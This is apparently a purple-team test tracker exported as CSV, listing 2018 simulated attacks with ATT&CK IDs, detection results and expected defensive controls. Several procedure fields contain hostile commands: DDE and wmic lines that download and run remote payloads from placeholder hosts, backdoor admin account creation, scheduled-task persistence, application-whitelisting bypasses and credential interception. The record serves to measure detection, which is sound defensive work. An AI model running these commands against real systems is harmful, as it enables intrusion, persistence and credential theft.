Enterprise Purple – 2018 Q1,Database Assault,Exploitation,Fingerprint and brute force Oracle databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,,,2018-01-19T18:18:47.130Z,1516385927130,2018-01-19T18:20:44.130Z,1516386044130,2018-01-19T20:03:31.130Z,1516392211130,Security Risk Advisors,,Attempt to exploit insecurely configured Oracle databases on the network.,,,High,High,Internal,Low,,,,"Oscanner,Nmap,Metasploit"
Enterprise Purple – 2018 Q1,Physical Access,Exploitation,Locked workstation attack,T1200,,Workstation Local Attack,Completed,NotDetected,TBD,TBD,No,,1) Payload run from bashbunny device is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines",,2018-01-15T08:15:51.130Z,1516004151130,2018-01-15T09:39:43.130Z,1516009183130,2018-01-15T11:20:29.130Z,1516015229130,Security Risk Advisors,,"Setup rogue DHCP server and connect to laptop in locked state, intercept credentials using Responder tool.",Use bashbunny with responder loaded,,Low,High,Both,Medium,,,,"Responder,Manual Techniques"
Enterprise Purple – 2018 Q1,Physical Access,Exploitation,Mouse Jacking,T1200,,Wireless Attack,Completed,NotDetected,TBD,TBD,No,,1) Established C2 payload from mouse jacker payload is detected by EDR tool and/or SIEM events.,,,"SIEM,EDR,Secure Baselines",,2018-01-15T12:56:12.130Z,1516020972130,2018-01-15T14:04:38.130Z,1516025078130,2018-01-15T14:44:33.130Z,1516027473130,Security Risk Advisors,,Attack local laptop via preexisting vulnerable USB mouse dongle.,jackit --script <Ducky_Script>,,Low,High,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike,JackIt"
Enterprise Purple – 2018 Q1,Physical Access,Exploitation,Laptop or workstation boot attack,T1091,,Workstation Local Attack,Completed,Blocked,TBD,No,TBD,,,,,Secure Baselines,Secure Configs,2018-01-15T18:44:07.130Z,1516041847130,2018-01-15T20:24:44.130Z,1516047884130,2018-01-15T21:38:46.130Z,1516052326130,Security Risk Advisors,,Attempt cold boot on laptops with missing or partial FDE,Load kali on boot-able usb,,Low,High,Both,Medium,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Physical Access,Exploitation,USB Rubby Ducky,T1091,,Workstation Local Attack,Completed,NotDetected,TBD,TBD,No,,1) Payload from rubber ducky is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines",,2018-01-15T16:13:39.130Z,1516032819130,2018-01-15T17:44:48.130Z,1516038288130,2018-01-15T18:22:13.130Z,1516040533130,Security Risk Advisors,,Attack local laptop/workstation using USB device to execute malicious code.,cmd /c \\<share>\<folder>\file.bat,,Medium,High,Internal,High,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2018 Q1,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 4,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,Endpoint Protection,,2018-01-21T16:58:13.130Z,1516553893130,2018-01-21T18:24:39.130Z,1516559079130,2018-01-21T19:31:17.130Z,1516563077130,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Malware Profile Simulation,Exploitation,Files with Ransomware Extensions #2,,,Ransomware,Completed,NotDetected,TBD,TBD,No,,,,,EDR,,2018-01-22T00:02:35.130Z,1516579355130,2018-01-22T00:45:18.130Z,1516581918130,2018-01-22T02:34:09.130Z,1516588449130,Security Risk Advisors,,"Generate a large number of files with a ransomware extension

extension:
- kratos","ps> 1..100 | %{new-item -type file -path ""$_.extension""}",,High,High,Both,Low,,,,
Enterprise Purple – 2018 Q1,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 1,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,Endpoint Protection,,2018-01-21T06:29:02.130Z,1516516142130,2018-01-21T07:48:30.130Z,1516520910130,2018-01-21T09:21:08.130Z,1516526468130,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Malware Profile Simulation,Exploitation,Files with Ransomware Extensions #1,,,Ransomware,Completed,Detected,High,TBD,TBD,,,,,"EDR,Endpoint Protection",Donpachi,2018-01-21T21:08:44.130Z,1516568924130,2018-01-21T22:47:48.130Z,1516574868130,2018-01-21T23:26:05.130Z,1516577165130,Security Risk Advisors,,"Generate a large number of files with a ransomware extension

extensions:
- locky
- ykcol","ps> 1..100 | %{new-item -type file -path ""$_.extension""}",,High,High,Both,Low,,,,
Enterprise Purple – 2018 Q1,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 2,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,Endpoint Protection,,2018-01-21T10:30:30.130Z,1516530630130,2018-01-21T10:45:03.130Z,1516531503130,2018-01-21T12:05:02.130Z,1516536302130,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 3,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,Endpoint Protection,,2018-01-21T13:21:34.130Z,1516540894130,2018-01-21T14:39:34.130Z,1516545574130,2018-01-21T16:23:50.130Z,1516551830130,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Endpoint Persistence,Persistence,Use of WMI Subscription for persistent jobs,T1546.003,,Windows Management Instrumentation,Completed,Detected,High,TBD,No,,1) EDR and/or SIEM rules are configured to detect suspicious WMI execution,,,"SIEM,EDR","DoDonpachi,Progear",2018-01-15T05:35:06.130Z,1515994506130,2018-01-15T06:18:54.130Z,1515997134130,2019-01-29T10:54:28.188Z,1548759268188,Security Risk Advisors,,Establish persistence using WMI event subscriptions.,"Create a one liner payload
cat payload.txt | iconv --to-code=UTF-16LE | base64 -w 0

Red team → Persistence → WMI Event Persistence using PowerShell",https://github.com/harleyQu1nn/AggressorScripts/tree/master/Persistence,Medium,Medium,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2018 Q1,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence using .BAT file,T1547.001,,Registry Modification,Completed,Blocked,TBD,No,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Donpachi,2018-01-14T21:38:34.130Z,1515965914130,2018-01-14T21:39:06.130Z,1515965946130,2018-01-14T21:56:19.130Z,1515966979130,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Endpoint Persistence,Persistence,Use of schtasks.exe for persistent jobs,T1053,,Scheduled tasks,Completed,Detected,Med,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows task scheduler events,,,"SIEM,EDR",Progear,2018-01-14T23:45:20.130Z,1515973520130,2018-01-14T23:58:45.130Z,1515974325130,2019-01-28T16:40:29.968Z,1548693629968,Security Risk Advisors,,Create a scheduled task,"schtasks /Create /SC DAILY /TN ""Malicious Task"" /TR ""C:MaliciousFile.bat"" /ST 09:00",,Medium,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Endpoint Persistence,Persistence,Create a Local Administrator User on Server,T1136,,Backdoor Accounts,Completed,Detected,High,TBD,Yes,,"1) EDR tool alerts on suspicious use of Windows 'net user' and similar commands,2) SIEM alerts on local and domain user and group creation and modifications",,,"SIEM,EDR",Progear,2018-01-15T01:34:34.130Z,1515980074130,2018-01-15T03:04:16.130Z,1515985456130,2019-01-28T16:40:47.884Z,1548693647884,Security Risk Advisors,,Create a Local administrator user after the compromise of a system.,"net user /add [username] [password]
new localgroup administrators [username] /add",,Medium,High,Internal,Low,,,,
Enterprise Purple – 2018 Q1,Endpoint Persistence,Persistence,Use of sc.exe to create rogue service to maintain access,T1543.003,,Rogue Service Creation,Completed,Detected,Med,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows service creation events,,,"SIEM,EDR","DoDonpachi,Progear",2018-01-14T14:12:13.130Z,1515939133130,2018-01-14T15:32:58.130Z,1515943978130,2019-01-28T16:40:18.316Z,1548693618316,Security Risk Advisors,,Modification of the registry startup keys to launch a rogue service.,,,Low,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence,T1547.001,,Registry Modification,Completed,Blocked,TBD,No,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Donpachi,2018-01-14T18:17:40.130Z,1515953860130,2018-01-14T20:17:26.130Z,1515961046130,2018-01-14T21:15:36.130Z,1515964536130,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,External Automated Scans,Reconnaissance,Application Vulnerability Scan - TARGET 1,T1046,,Vulnerability scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF",,2018-01-04T13:25:23.130Z,1515072323130,2018-01-04T15:00:17.130Z,1515078017130,2018-01-04T15:30:47.130Z,1515079847130,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",Run active scans using Burp or other web application scanning tools,,High,Medium,Both,Low,,,,BurpSuite
Enterprise Purple – 2018 Q1,External Automated Scans,Reconnaissance,Application Vulnerability Scan - TARGET 2,T1046,,Vulnerability scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF",,2018-01-04T16:17:41.130Z,1515082661130,2018-01-04T16:44:10.130Z,1515084250130,2018-01-04T17:36:57.130Z,1515087417130,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",Run active scans using Burp or other web application scanning tools,,High,Medium,Both,Low,,,,BurpSuite
Enterprise Purple – 2018 Q1,External Automated Scans,Reconnaissance,Network Vulnerability Scan - External IP Ranges,T1046,,Vulnerability scanning,Completed,Detected,Med,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF",MUSHA,2018-01-04T18:49:35.130Z,1515091775130,2018-01-04T20:10:50.130Z,1515096650130,2018-01-04T20:39:01.130Z,1515098341130,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",,,High,Medium,Both,Low,,,,Nessus
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,8 - Macro - LuckyStrike PowerShell CellEmbed,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Progear,2018-01-10T23:43:21.130Z,1515627801130,2018-01-10T23:53:24.130Z,1515628404130,2019-01-28T16:38:20.752Z,1548693500752,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,7 - Macro - MMG WMI Exe,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-01-11T18:31:27.130Z,1515695487130,2018-01-11T18:59:14.130Z,1515697154130,2019-01-28T17:02:06.767Z,1548694926767,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,3 - Macro - WScript PowerShell,T1203,,Client-side Execution,Completed,Blocked,TBD,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Donpachi,2018-01-10T17:23:22.130Z,1515605002130,2018-01-10T18:48:13.130Z,1515610093130,2018-01-10T20:08:16.130Z,1515614896130,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,9 - Macro - MSBuild,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-01-10T21:35:00.130Z,1515620100130,2018-01-10T22:53:51.130Z,1515624831130,2019-01-28T17:02:27.299Z,1548694947299,Security Risk Advisors,,Execute malicious Office document on the endpoint,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,4 - Macro - WScript EXE,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-01-11T13:26:07.130Z,1515677167130,2018-01-11T14:32:06.130Z,1515681126130,2019-01-28T17:01:45.035Z,1548694905035,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,2 - Macro - CobaltStrike Standard (MMG),T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-01-11T11:20:41.130Z,1515669641130,2018-01-11T12:04:44.130Z,1515672284130,2019-01-28T17:01:25.276Z,1548694885276,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,11 - DDE - Exe,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-01-11T05:17:24.130Z,1515647844130,2018-01-11T05:36:00.130Z,1515648960130,2019-01-28T17:02:44.400Z,1548694964400,Security Risk Advisors,,Execute malicious Office document on the endpoint,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,12 - Macro - Remote Template,T1203,,Client-side Execution,Completed,Detected,High,TBD,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",DoDonpachi,2018-01-11T08:00:02.130Z,1515657602130,2018-01-11T09:07:36.130Z,1515661656130,2018-01-11T10:49:53.130Z,1515667793130,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,1 - Macro - Cobalt Strike Standard,T1203,,Client-side Execution,Completed,Detected,High,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines","DoDonpachi,Donpachi",2018-01-10T14:35:49.130Z,1515594949130,2018-01-10T15:37:19.130Z,1515598639130,2019-01-28T17:02:59.432Z,1548694979432,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Generate MS Office Macro from cobalt Strike (Attacks -> Packages -> MS Office Macro)

Put macro in office document

Execute the office document on endpoint",,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,10 - DDE - PowerShell,T1203,,Client-side Execution,Completed,Detected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines","DoDonpachi,Progear",2018-01-11T02:25:00.130Z,1515637500130,2018-01-11T03:35:19.130Z,1515641719130,2019-01-28T16:38:35.827Z,1548693515827,Security Risk Advisors,,Execute malicious Office document on the endpoint,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,6 - Macro - MMG WMI PowerShell,T1203,,Client-side Execution,Completed,Blocked,TBD,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Donpachi,2018-01-11T16:07:54.130Z,1515686874130,2018-01-11T16:29:10.130Z,1515688150130,2018-01-11T18:12:03.130Z,1515694323130,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Malicious Document Execution,Execution,5 - Macro - WScript PowerShell XOR,T1203,,Client-side Execution,Completed,Blocked,TBD,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Donpachi,2018-01-10T20:41:05.130Z,1515616865130,2018-01-10T20:45:00.130Z,1515617100130,2018-01-10T21:21:22.130Z,1515619282130,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Network MiTM,Exploitation,Unencrypted Windows Update,T1040,,Network spoofing,Completed,Blocked,TBD,No,TBD,,,,,Secure Baselines,Secure Configs,2018-01-17T01:43:06.130Z,1516153386130,2018-01-17T02:58:19.130Z,1516157899130,2018-01-17T04:05:07.130Z,1516161907130,Security Risk Advisors,,Intercept Windows Updates on the target laptop in order to run a malicious binary,./wsuxploit.sh <TARGET_IP> <WSUS_IP> <WSUS_PORT> <BINARY_PATH>,,High,High,Internal,Medium,,,,
Enterprise Purple – 2018 Q1,Network MiTM,Exploitation,LLMNR,T1557.001,,Network spoofing,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",,2018-01-17T05:09:47.130Z,1516165787130,2018-01-17T06:24:51.130Z,1516170291130,2018-01-17T08:07:02.130Z,1516176422130,Security Risk Advisors,,"Respond to local network queries for systems over LLMNR and NetBIOS, obtain domain user password hashes and clear text credentials.",,,High,High,Internal,Medium,,,,Responder
Enterprise Purple – 2018 Q1,Network MiTM,Exploitation,Basic Auth & WPAD,T1040,,Network spoofing,Completed,Blocked,TBD,No,TBD,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",Secure Configs,2018-01-17T13:26:01.130Z,1516195561130,2018-01-17T13:43:41.130Z,1516196621130,2018-01-17T14:06:59.130Z,1516198019130,Security Risk Advisors,,"Respond to local network queries for systems over LLMNR and NetBIOS, obtain domain user password hashes and clear text credentials",,,High,High,Internal,Medium,,,,Responder
Enterprise Purple – 2018 Q1,Network MiTM,Exploitation,Inveigh,T1557.001,,Network Spoofing,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",,2018-01-17T09:30:44.130Z,1516181444130,2018-01-17T11:23:15.130Z,1516188195130,2018-01-17T11:56:01.130Z,1516190161130,Security Risk Advisors,,Run the powershell inveigh toolset via a beacon.,Invoke-Inveigh  NBNS - Y,,Low,Low,Internal,Low,,,,
Enterprise Purple – 2018 Q1,External Port Scans,Reconnaissance,"External - Moderate Port Scan with 10 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,Detected,Info,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,"Firewall,SIEM",MUSHA,2018-01-03T06:14:15.130Z,1514960055130,2018-01-03T06:15:29.130Z,1514960129130,2019-01-28T17:50:09.606Z,1548697809606,Security Risk Advisors,,Identify open ports and services,"nmap --open -v 2 -sS -Pn -p 21,80,443,8080,8443 --script=ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-admin-check.nse,http-title.nse --script-args=http.useragent=""Mozilla/5.0; Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; like Gecko"" -oA scans/nmap_moderate -iL targets.txt",,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2018 Q1,External Port Scans,Reconnaissance,"External - Stealthy Port Scan with 3 ports, service enumeration, limited NSE's",T1046,,Port scanning,Completed,Detected,Info,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,"Firewall,SIEM",MUSHA,2018-01-03T08:41:27.130Z,1514968887130,2018-01-03T10:00:45.130Z,1514973645130,2019-01-28T17:51:00.950Z,1548697860950,Security Risk Advisors,,Identify open ports and services,"nmap --open -v 2 -sS -Pn -p 80,443,8080 --data-length 471 --randomize-hosts --script=http-title.nse --script-args=http.useragent=""Mozilla/5.0;Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; like Gecko"" -oA scans/nmap_stealthy -iL targets.txt",,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2018 Q1,External Port Scans,Reconnaissance,"External - Noisy Port Scan with 1000 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,Detected,Info,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,"Firewall,SIEM",MUSHA,2018-01-03T12:57:45.130Z,1514984265130,2018-01-03T13:06:22.130Z,1514984782130,2019-01-28T17:51:18.931Z,1548697878931,Security Risk Advisors,,Identify open ports and services,nmap --open -v2 -sS -Pn -oA nmap_noisy -iL ranges.txt,,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Process Creation Using MSBuild,,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",,2018-01-13T21:38:05.130Z,1515879485130,2018-01-13T22:37:57.130Z,1515883077130,2018-01-13T23:39:44.130Z,1515886784130,Security Risk Advisors,,Spawn a new process using MSBuild.,msbuild.exe <path to xml file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Process Creation Using HTA,T1218.005,,Trusted Windows Binary,Completed,Blocked,TBD,No,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",Donpachi,2018-01-13T05:34:07.130Z,1515821647130,2018-01-13T07:22:43.130Z,1515828163130,2018-01-13T08:52:07.130Z,1515833527130,Security Risk Advisors,,Spawn a new process using HTA.,mshta <full path to hta>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Process Creation Using Regsvr32,T1218.010,,Trusted Windows Binary,Completed,Detected,High,No,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Donpachi",2018-01-13T01:57:16.130Z,1515808636130,2018-01-13T03:28:08.130Z,1515814088130,2019-01-28T17:10:58.041Z,1548695458041,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with Regsvr32 (Squiblydoo).,regsvr32 /s /n /u /i:<path to scriptlet> scrobj.dll,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Process Creation Using VBS,T1059.004,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",DoDonpachi,2018-01-13T17:56:46.130Z,1515866206130,2018-01-13T19:27:46.130Z,1515871666130,2019-01-29T06:16:34.342Z,1548742594342,Security Risk Advisors,,Spawn a new process using VBS.,cscript <path to vbs file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Process Creation Using JS,T1059.004,,Trusted Windows Binary,Completed,Detected,High,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",DoDonpachi,2018-01-13T15:27:08.130Z,1515857228130,2018-01-13T16:51:08.130Z,1515862268130,2019-01-29T10:53:48.954Z,1548759228954,Security Risk Advisors,,Spawn a new process using JS.,cscript <path to js file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Obfuscated Commands - CMD,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,,,,"EDR,Endpoint Protection",,2018-01-14T04:16:03.130Z,1515903363130,2018-01-14T05:25:26.130Z,1515907526130,2018-01-14T05:59:17.130Z,1515909557130,Security Risk Advisors,,Run an obfuscated CMD command to run a malicious command.,invoke-dosfuscation -> run command,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Process Creation Using PowerShell,T1059.001,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2018-01-13T09:17:03.130Z,1515835023130,2018-01-13T10:39:31.130Z,1515839971130,2019-01-28T16:39:15.891Z,1548693555891,Security Risk Advisors,,Spawn a new process using PowerShell.,powershell.exe <run command>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,PowerShell Downgrade,T1059.001,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2018-01-14T06:55:03.130Z,1515912903130,2018-01-14T08:45:26.130Z,1515919526130,2019-01-28T16:39:29.266Z,1548693569266,Security Risk Advisors,,Execute PowerShell in a degraded version to avoid security controls in newer versions.,powershell.exe -v 2,,Low,Low,Internal,Low,,,,PowerShell
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Process Creation Using WMI Format Table,T1047,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",,2018-01-14T10:07:09.130Z,1515924429130,2018-01-14T12:03:10.130Z,1515931390130,2018-01-14T12:37:10.130Z,1515933430130,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with WMI Format Table (Squiblytoo).,wmic os get /format:<url to xsl file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2018 Q1,Suspicious Process Execution,Exploitation,Process Creation Using WMI,T1047,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2018-01-13T12:24:21.130Z,1515846261130,2018-01-13T14:04:04.130Z,1515852244130,2019-01-28T17:09:40.089Z,1548695380089,Security Risk Advisors,,Spawn a new process using WMI.,"wmic process call create ""powershell -nop -c 'IEX ((new-object net.webclient).downloadstring(https://somedomain/1234))'""",,Low,Low,Internal,Low,,,,Native Windows Commands
